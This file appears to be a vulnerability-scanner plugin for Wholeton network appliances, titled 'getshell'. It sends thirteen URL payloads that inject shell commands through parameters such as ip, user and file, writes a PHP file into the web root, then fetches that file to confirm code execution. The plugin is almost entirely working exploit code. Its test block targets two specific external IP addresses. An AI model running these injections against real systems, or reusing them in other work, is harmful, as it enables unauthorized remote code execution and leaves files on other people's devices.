#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = wholeton getshell

import random
import urllib

def assign(service, arg):
	if service == 'wholeton':
		return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-0103644
    #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103774
    #No.3 http://www.wooyun.org/bugs/wooyun-2010-0103676
    payloads = ["base/stats/realtime/user_prohibit_internet.php?ip=1.1.1.1;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/stats/realtime/underLineUser.php?action="+urllib.quote('允许上网')+"&identifier[]=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/vpn/download_nodes.php?file=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/tpl/delectSSL.php?id=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/user/offLine.php?user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/vpn/uf.php?cmd=add&user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "base/vpn/uf.php?cmd=del&user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "base/vpn/uf.php?cmd=mod&user=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/vpn/netgatedel.php?system=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "base/vpn/rdpdel.php?appName=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/",
                "base/vpn/userdel.php?userName=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "base/networking/ipbindmac_gateway.php?gateway=123;echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/", 
                "base/message/ajaxGoAuth.php?type=sms&ip=222222|echo%20'<?php%20print(md5(1));?>'>/usr/local/WholetonTM/htdocs/"
               ]
    for payload in payloads:
        filename = 'shell'+str(random.randint(1,10000000000))+'.php'
        target = arg + payload + filename
        code, head, body, errcode, final_url = curl.curl2(target);
        if code == 404:
            continue
        target2 = arg + filename
        code, head, body, errcode, final_url = curl.curl2(target2);
        if 'c4ca4238a0b923820dcc509a6f75849' in body:
            security_hole(target+' ==getshell>> '+target2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wholeton', 'http://111.206.133.4/')[1])
    audit(assign('wholeton', 'http://222.223.56.116/')[1])